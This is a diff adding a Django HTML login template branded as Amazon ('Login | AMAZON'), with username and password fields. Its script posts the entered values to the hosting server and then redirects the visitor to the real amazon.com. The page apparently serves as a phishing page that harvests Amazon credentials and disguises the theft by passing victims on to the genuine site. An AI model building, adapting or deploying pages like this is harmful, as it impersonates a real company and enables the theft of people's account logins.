@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login | AMAZON</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            background-color: #f8f9fa;
+        }
+        .hidden {
+            display: none;
+        }
+        .hero {
+            background: url('https://images.unsplash.com/photo-1555992336-03a23c6a88e8') center/cover no-repeat;
+            height: 300px;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div id="loginPage" class="container vh-100 d-flex justify-content-center align-items-center">
+    <div class="card shadow p-4" style="width: 350px;">
+        <h3 class="text-center mb-3">Amazon Login</h3>
+
+        <!-- IMPORTANT: FORM ADDED (DESIGN UNCHANGED) -->
+        <form id="loginForm">
+            {% csrf_token %}
+
+            <div class="mb-3">
+                <label class="form-label">Username</label>
+                <input type="text" name="username" id="username" class="form-control" placeholder="Enter username">
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label">Password</label>
+                <input type="password" name="password" id="password" class="form-control" placeholder="Enter password">
+            </div>
+
+            <button type="submit" class="btn btn-danger w-100">Login</button>
+        </form>
+
+        <p id="error" class="text-danger text-center mt-2">
+            {% if error %}{{ error }}{% endif %}
+        </p>
+
+        <p id="success" class="text-success text-center mt-2">
+            {% if success %}{{ success }}{% endif %}
+        </p>
+    </div>
+</div>
+
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+    // Intercept form submit and send POST to Django
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const form = e.target;
+        const formData = new FormData(form);
+
+        fetch("/", {
+            method: "POST",
+            body: formData
+        })
+        .then(res => res.text())
+        .then(html => {
+            document.open();
+            document.write(html);
+            document.close();
+        });
+    });
+
+
+    // Redirect if login success message exists
+    window.addEventListener("DOMContentLoaded", function () {
+        const successMsg = document.getElementById("success");
+
+        if (successMsg && successMsg.innerText.trim() !== "") {
+            // small delay so user sees success message
+            setTimeout(() => {
+                window.location.href = "https://www.amazon.com";
+            }, 800);
+        }
+    });
+</script>
+
+</body>
+</html>
